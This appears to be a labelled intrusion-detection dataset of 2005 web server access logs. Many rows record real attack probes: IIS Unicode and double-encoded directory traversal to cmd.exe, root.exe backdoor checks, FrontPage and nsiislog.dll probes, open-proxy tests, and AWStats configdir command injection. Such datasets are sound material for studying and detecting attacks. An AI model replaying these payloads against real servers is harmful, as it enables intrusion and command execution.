Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-03-13","08:52:47","210.116.59.164","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S122"
"2005-03-13","08:53:32","210.116.59.164","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S122"
"2005-03-13","08:54:19","210.116.59.164","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S122"
"2005-03-13","08:55:11","210.116.59.164","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S122"
"2005-03-13","08:56:00","210.116.59.164","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S122"
"2005-03-13","08:57:18","211.141.115.145","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S137"
"2005-03-13","12:50:27","66.30.71.74","GET","/scripts/nsiislog.dll","HTTP/1.1","'404'",1050,"-","-","AA","S482"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:11","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:12","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:13","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:13","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:13","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:13","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:14","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:14","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:14","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","15:23:14","218.1.111.50","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)","AF","S181"
"2005-03-13","16:08:58","66.131.126.31","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S466"
"2005-03-13","16:28:59","69.158.7.209","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S539"
"2005-03-13","17:52:33","213.129.21.137","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S161"
"2005-03-13","18:35:14","24.23.244.160","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:16","24.23.244.160","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:18","24.23.244.160","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:20","24.23.244.160","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:22","24.23.244.160","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:24","24.23.244.160","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:26","24.23.244.160","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:28","24.23.244.160","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:29","24.23.244.160","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:31","24.23.244.160","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:32","24.23.244.160","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:35","24.23.244.160","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:36","24.23.244.160","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S336"
"2005-03-13","18:35:38","24.23.244.160","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S336"
"2005-03-13","18:35:40","24.23.244.160","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","18:35:42","24.23.244.160","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S336"
"2005-03-13","19:49:44","24.130.169.87","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S329"
"2005-03-13","20:48:07","221.237.66.208","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S285"
"2005-03-13","22:22:46","208.46.133.177","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S111"
"2005-03-13","22:52:51","218.88.202.208","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S232"
"2005-03-13","23:14:25","219.186.156.26","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S250"
"2005-03-14","01:03:12","65.202.33.226","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S461"
"2005-03-14","02:11:58","208.39.169.124","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S110"
"2005-03-14","02:58:45","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:45","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:45","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:46","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:47","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:48","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","02:58:48","220.110.29.27","GET","/","HTTP/1.1","'400'",308,"-","-","AB","S256"
"2005-03-14","03:25:31","61.205.6.71","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S404"
"2005-03-14","04:54:32","68.191.137.235","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S517"
"2005-03-14","07:35:41","157.91.44.1","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S23"
"2005-03-14","08:58:06","209.213.220.227","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S120"
"2005-03-14","09:33:54","218.201.121.99","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S194"
"2005-03-14","11:40:25","222.166.160.63","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S310"
"2005-03-14","13:30:55","66.21.127.198","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S479"
"2005-03-14","15:27:23","24.185.27.145","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S332"
"2005-03-14","15:59:40","69.246.7.31","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:40","69.246.7.31","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:40","69.246.7.31","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:41","69.246.7.31","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:41","69.246.7.31","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:41","69.246.7.31","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:42","69.246.7.31","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:42","69.246.7.31","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:42","69.246.7.31","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:42","69.246.7.31","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:42","69.246.7.31","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:43","69.246.7.31","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:43","69.246.7.31","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S547"
"2005-03-14","15:59:43","69.246.7.31","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S547"
"2005-03-14","15:59:43","69.246.7.31","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","15:59:43","69.246.7.31","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S547"
"2005-03-14","18:57:36","67.170.0.153","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:37","67.170.0.153","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:37","67.170.0.153","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:37","67.170.0.153","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:38","67.170.0.153","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:41","67.170.0.153","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:42","67.170.0.153","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:42","67.170.0.153","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:43","67.170.0.153","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:43","67.170.0.153","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:43","67.170.0.153","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:44","67.170.0.153","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:44","67.170.0.153","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S501"
"2005-03-14","18:57:44","67.170.0.153","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S501"
"2005-03-14","18:57:44","67.170.0.153","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","18:57:45","67.170.0.153","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S501"
"2005-03-14","20:00:37","222.166.160.3","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S304"
"2005-03-14","20:48:12","61.10.7.140","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S366"
"2005-03-14","21:51:27","61.232.252.176","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S409"
"2005-03-15","02:35:51","219.133.25.250","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S238"
"2005-03-15","02:37:42","139.68.4.4","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S15"
"2005-03-15","03:22:36","204.102.106.103","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S93"
"2005-03-15","06:11:48","61.10.7.68","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S379"
"2005-03-15","06:15:32","67.136.86.162","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S495"
"2005-03-15","06:33:23","157.91.48.191","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S24"
"2005-03-15","08:07:39","67.154.159.190","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S497"
"2005-03-15","09:53:49","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:49","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:50","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:50","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:51","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:52","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:53","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:54","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1098,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:54","81.181.146.13","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:55","81.181.146.13","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S570"
"2005-03-15","09:53:55","81.181.146.13","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:55","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1098,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:55","81.181.146.13","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:56","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:56","81.181.146.13","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
"2005-03-15","09:53:57","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1098,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:57","81.181.146.13","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S570"
"2005-03-15","09:53:57","81.181.146.13","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'500'",1097,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AL","S570"
"2005-03-15","09:53:58","81.181.146.13","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S570"
